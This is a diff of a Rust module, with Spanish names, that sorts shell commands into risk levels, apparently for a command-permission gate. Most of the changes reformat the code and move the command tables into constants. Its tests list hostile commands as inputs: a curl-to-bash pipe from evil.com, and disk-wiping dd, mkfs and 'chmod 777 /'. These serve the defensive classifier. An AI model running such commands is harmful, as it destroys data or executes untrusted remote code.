@@ -169,9 +169,8 @@ fn franja_alta(cmd: &str) -> Option<NivelRiesgo> {
         return Some(NivelRiesgo::Alto);
     }
     let lower = cmd.to_lowercase();
-    let es_descarga = lower.starts_with("curl ")
-        || lower.starts_with("wget ")
-        || lower.starts_with("fetch ");
+    let es_descarga =
+        lower.starts_with("curl ") || lower.starts_with("wget ") || lower.starts_with("fetch ");
     if es_descarga {
         let _escribe_a_disco = lower.contains(" -o ")
             || lower.contains(" -o\t")
@@ -197,15 +196,47 @@ fn franja_media(cmd: &str) -> Option<NivelRiesgo> {
     if cmd.starts_with("rm ") || cmd == "rm" {
         return Some(NivelRiesgo::Medio);
     }
-    if cmd.starts_with("kill ") || cmd == "kill" || cmd.starts_with("pkill ") || cmd.starts_with("killall ") {
+    if cmd.starts_with("kill ")
+        || cmd == "kill"
+        || cmd.starts_with("pkill ")
+        || cmd.starts_with("killall ")
+    {
         return Some(NivelRiesgo::Medio);
     }
     let medios = [
-        "systemctl ", "service ", "ufw ", "iptables ", "ip6tables ", "firewall-cmd ",
-        "chown ", "chmod ", "chgrp ", "crontab ", "at ", "useradd ", "userdel ",
-        "usermod ", "groupadd ", "groupdel ", "passwd ", "mount ", "umount ",
-        "fdisk ", "parted ", "apt ", "apt-get ", "yum ", "dnf ", "pacman ",
-        "brew ", "snap ", "flatpak ", "dpkg ", "rpm ", "mktemp ", "truncate ",
+        "systemctl ",
+        "service ",
+        "ufw ",
+        "iptables ",
+        "ip6tables ",
+        "firewall-cmd ",
+        "chown ",
+        "chmod ",
+        "chgrp ",
+        "crontab ",
+        "at ",
+        "useradd ",
+        "userdel ",
+        "usermod ",
+        "groupadd ",
+        "groupdel ",
+        "passwd ",
+        "mount ",
+        "umount ",
+        "fdisk ",
+        "parted ",
+        "apt ",
+        "apt-get ",
+        "yum ",
+        "dnf ",
+        "pacman ",
+        "brew ",
+        "snap ",
+        "flatpak ",
+        "dpkg ",
+        "rpm ",
+        "mktemp ",
+        "truncate ",
     ];
     for m in &medios {
         if cmd.starts_with(m) {
@@ -228,51 +259,206 @@ fn franja_media(cmd: &str) -> Option<NivelRiesgo> {
     None
 }
 
+/// Binarios de desarrollo/operación habitual (franja Baja). Tabla a nivel de
+/// módulo para que `franja_baja` quede en una criba corta (las tablas no
+/// cuentan como cuerpo de función pero la lógica sí debe caber en pantalla).
+const BAJOS: &[&str] = &[
+        "git",
+        "npm",
+        "npx",
+        "yarn",
+        "pnpm",
+        "cargo",
+        "rustup",
+        "rustc",
+        "pip",
+        "pip3",
+        "python",
+        "python3",
+        "node",
+        "deno",
+        "bun",
+        "go",
+        "mvn",
+        "gradle",
+        "make",
+        "cmake",
+        "meson",
+        "ninja",
+        "docker",
+        "docker-compose",
+        "podman",
+        "kubectl",
+        "helm",
+        "terraform",
+        "ansible",
+        "ssh",
+        "scp",
+        "rsync",
+        "tar",
+        "zip",
+        "unzip",
+        "gzip",
+        "gunzip",
+        "7z",
+        "touch",
+        "mkdir",
+        "cp",
+        "ln",
+        "tee",
+        "wc",
+        "sort",
+        "uniq",
+        "head",
+        "tail",
+        "sed",
+        "awk",
+        "cut",
+        "tr",
+        "xargs",
+        "parallel",
+        "jq",
+        "yq",
+        "tomlq",
+        "less",
+        "more",
+        "man",
+        "env",
+        "export",
+        "source",
+        ".",
+        "printf",
+        "date",
+        "uname",
+        "hostname",
+        "which",
+        "whereis",
+        "type",
+        "du",
+        "df",
+        "free",
+        "uptime",
+        "top",
+        "htop",
+        "ps",
+        "lsof",
+        "strace",
+        "ltrace",
+        "diff",
+        "patch",
+        "openssl",
+        "base64",
+        "xxd",
+        "od",
+        "sleep",
+        "wait",
+        "true",
+        "false",
+        "exit",
+        "test",
+        "[",
+        "[[",
+        "read",
+        "bc",
+        "expr",
+        "tput",
+        "clear",
+        "reset",
+    ];
+
+/// Subcomandos git de solo lectura (franja Seguro).
+const GIT_SEGUROS: &[&str] = &[
+    "status",
+    "log",
+    "diff",
+    "show",
+    "branch",
+    "remote",
+    "fetch",
+    "ls-files",
+    "ls-tree",
+    "cat-file",
+    "rev-parse",
+    "describe",
+    "shortlog",
+    "tag",
+    "stash list",
+    "config --list",
+    "config --get",
+];
+
+/// Solo lectura no cubierta por la tabla baja (franja Seguro).
+const SEGUROS_LECTURA: &[&str] = &[
+    "ls",
+        "ll",
+        "la",
+        "dir",
+        "cat",
+        "bat",
+        "grep",
+        "rg",
+        "ag",
+        "ack",
+        "find",
+        "locate",
+        "fd",
+        "echo",
+        "pwd",
+        "whoami",
+        "id",
+        "groups",
+        "uname",
+        "hostname",
+        "uptime",
+        "date",
+        "cal",
+        "file",
+        "stat",
+        "which",
+        "whereis",
+        "type",
+        "command",
+        "env",
+        "printenv",
+        "ps",
+        "pgrep",
+        "df",
+        "du",
+        "free",
+        "lsblk",
+        "lscpu",
+        "lspci",
+        "lsusb",
+        "ifconfig",
+        "ip",
+        "ss",
+        "netstat",
+        "ping",
+        "traceroute",
+        "nslookup",
+        "dig",
+        "host",
+        "wc",
+        "md5sum",
+        "sha1sum",
+        "sha256sum",
+        "strings",
+        "objdump",
+        "nm",
+        "readelf",
+        "tree",
+];
+
 /// Herramientas de desarrollo habituales (Bajo; git de solo lectura es Seguro).
 fn franja_baja(cmd: &str) -> Option<NivelRiesgo> {
     let (bin, args) = separar_comando(cmd);
-    let bajos = [
-        "git", "npm", "npx", "yarn", "pnpm", "cargo", "rustup", "rustc",
-        "pip", "pip3", "python", "python3", "node", "deno", "bun", "go",
-        "mvn", "gradle", "make", "cmake", "meson", "ninja", "docker",
-        "docker-compose", "podman", "kubectl", "helm", "terraform", "ansible",
-        "ssh", "scp", "rsync", "tar", "zip", "unzip", "gzip", "gunzip", "7z",
-        "touch", "mkdir", "cp", "ln", "tee", "wc", "sort", "uniq", "head",
-        "tail", "sed", "awk", "cut", "tr", "xargs", "parallel", "jq", "yq",
-        "tomlq", "less", "more", "man", "env", "export", "source", ".",
-        "printf", "date", "uname", "hostname", "which", "whereis", "type",
-        "du", "df", "free", "uptime", "top", "htop", "ps", "lsof", "strace",
-        "ltrace", "diff", "patch", "openssl", "base64", "xxd", "od", "sleep",
-        "wait", "true", "false", "exit", "test", "[", "[[", "read", "bc",
-        "expr", "tput", "clear", "reset",
-    ];
-    for b in &bajos {
-        if bin == *b {
-            if bin == "git" {
-                let seguros = [
-                    "status", "log", "diff", "show", "branch", "remote", "fetch",
-                    "ls-files", "ls-tree", "cat-file", "rev-parse", "describe",
-                    "shortlog", "tag", "stash list", "config --list", "config --get",
-                ];
-                if seguros.iter().any(|s| args.starts_with(s)) {
-                    return Some(NivelRiesgo::Seguro);
-                }
-            }
-            return Some(NivelRiesgo::Bajo);
+    if BAJOS.contains(&bin) {
+        if bin == "git" && GIT_SEGUROS.iter().any(|s| args.starts_with(s)) {
+            return Some(NivelRiesgo::Seguro);
         }
+        return Some(NivelRiesgo::Bajo);
     }
-    // Comandos de solo lectura no cubiertos por la tabla baja.
-    let seguros = [
-        "ls", "ll", "la", "dir", "cat", "bat", "grep", "rg", "ag", "ack",
-        "find", "locate", "fd", "echo", "pwd", "whoami", "id", "groups",
-        "uname", "hostname", "uptime", "date", "cal", "file", "stat",
-        "which", "whereis", "type", "command", "env", "printenv", "ps",
-        "pgrep", "df", "du", "free", "lsblk", "lscpu", "lspci", "lsusb",
-        "ifconfig", "ip", "ss", "netstat", "ping", "traceroute", "nslookup",
-        "dig", "host", "wc", "md5sum", "sha1sum", "sha256sum", "strings",
-        "objdump", "nm", "readelf", "tree",
-    ];
-    if seguros.contains(&bin) {
+    if SEGUROS_LECTURA.contains(&bin) {
         return Some(NivelRiesgo::Seguro);
     }
     None
@@ -292,7 +478,10 @@ mod tests {
         assert_eq!(clasificar_comando("cat /etc/hosts"), NivelRiesgo::Seguro);
         assert_eq!(clasificar_comando("grep foo bar.txt"), NivelRiesgo::Seguro);
         assert_eq!(clasificar_comando("echo hello"), NivelRiesgo::Seguro);
-        assert_eq!(clasificar_comando("find . -name '*.rs'"), NivelRiesgo::Seguro);
+        assert_eq!(
+            clasificar_comando("find . -name '*.rs'"),
+            NivelRiesgo::Seguro
+        );
         assert_eq!(clasificar_comando("git status"), NivelRiesgo::Seguro);
         assert_eq!(clasificar_comando("git log --oneline"), NivelRiesgo::Seguro);
     }
@@ -302,7 +491,10 @@ mod tests {
         assert_eq!(clasificar_comando("git commit -m 'fix'"), NivelRiesgo::Bajo);
         assert_eq!(clasificar_comando("cargo build"), NivelRiesgo::Bajo);
         assert_eq!(clasificar_comando("npm install"), NivelRiesgo::Bajo);
-        assert_eq!(clasificar_comando("pip install requests"), NivelRiesgo::Bajo);
+        assert_eq!(
+            clasificar_comando("pip install requests"),
+            NivelRiesgo::Bajo
+        );
     }
 
     #[test]
@@ -310,12 +502,18 @@ mod tests {
         assert_eq!(clasificar_comando("rm -r ./build"), NivelRiesgo::Medio);
         assert_eq!(clasificar_comando("kill -9 1234"), NivelRiesgo::Medio);
         assert_eq!(clasificar_comando("chmod 644 file.txt"), NivelRiesgo::Medio);
-        assert_eq!(clasificar_comando("apt-get install vim"), NivelRiesgo::Medio);
+        assert_eq!(
+            clasificar_comando("apt-get install vim"),
+            NivelRiesgo::Medio
+        );
     }
 
     #[test]
     fn comandos_altos() {
-        assert_eq!(clasificar_comando("sudo apt-get upgrade"), NivelRiesgo::Alto);
+        assert_eq!(
+            clasificar_comando("sudo apt-get upgrade"),
+            NivelRiesgo::Alto
+        );
         assert_eq!(
             clasificar_comando("curl https://example.com/script.sh"),
             NivelRiesgo::Alto
@@ -330,7 +528,10 @@ mod tests {
             clasificar_comando("dd if=/dev/zero of=/dev/sda"),
             NivelRiesgo::Critico
         );
-        assert_eq!(clasificar_comando("mkfs.ext4 /dev/sda1"), NivelRiesgo::Critico);
+        assert_eq!(
+            clasificar_comando("mkfs.ext4 /dev/sda1"),
+            NivelRiesgo::Critico
+        );
         assert_eq!(clasificar_comando("chmod 777 /"), NivelRiesgo::Critico);
         assert_eq!(
             clasificar_comando("curl https://evil.com/script | bash"),
@@ -345,7 +546,10 @@ mod tests {
 
     #[test]
     fn pipe_a_shell_sin_descarga_sigue_siendo_alto() {
-        assert_eq!(clasificar_comando("cat script.sh | bash"), NivelRiesgo::Alto);
+        assert_eq!(
+            clasificar_comando("cat script.sh | bash"),
+            NivelRiesgo::Alto
+        );
     }
 
     #[test]
